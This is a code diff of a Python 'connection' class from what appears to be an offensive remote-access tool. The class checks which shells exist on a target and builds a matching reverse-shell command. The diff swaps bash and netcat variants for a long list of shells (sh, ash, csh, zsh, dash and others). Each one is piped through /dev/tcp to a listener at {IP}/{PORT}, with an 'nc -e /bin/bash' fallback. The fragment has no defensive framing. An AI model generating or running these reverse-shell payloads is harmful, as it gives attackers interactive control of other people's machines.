@@ -54,17 +54,38 @@ class connection:
         global new_rev
         self.send_rcv("find /bin/ /usr/bin/")
 
-        if "\n/usr/bin/bash" in self.recorded:
-            self.rev = f"/usr/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+        if "sh" in self.recorded:
+            self.rev = f"sh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
-        if "\n/bin/bash" in self.recorded:
-            self.rev = f"/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+        if "ash" in self.recorded:
+            self.rev = f"ash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
-        if "\n/bin/nc" in self.recorded:
-            self.rev = f"/bin/nc {IP} {PORT} -e /bin/bash & \r"
+        if "csh" in self.recorded:
+            self.rev = f"csh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
-        if "\n/usr/bin/nc" in self.recorded:
-            self.rev = f"/usr/bin/nc {IP} {PORT} -e /bin/bash & \r"
+        if "bsh" in self.recorded:
+            self.rev = f"bsh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "ksh" in self.recorded:
+            self.rev = f"ksh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "zsh" in self.recorded:
+            self.rev = f"zsh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "pdksh" in self.recorded:
+            self.rev = f"pdksh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "tcsh" in self.recorded:
+            self.rev = f"tcsh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "mksh" in self.recorded:
+            self.rev = f"mksh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "dash" in self.recorded:
+            self.rev = f"dash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+
+        if "/bin/nc" in self.recorded:
+            self.rev = f"nc {IP} {PORT} -e /bin/bash & \r"
 
         print(self.rev)
         new_rev[self.addr] = self.rev
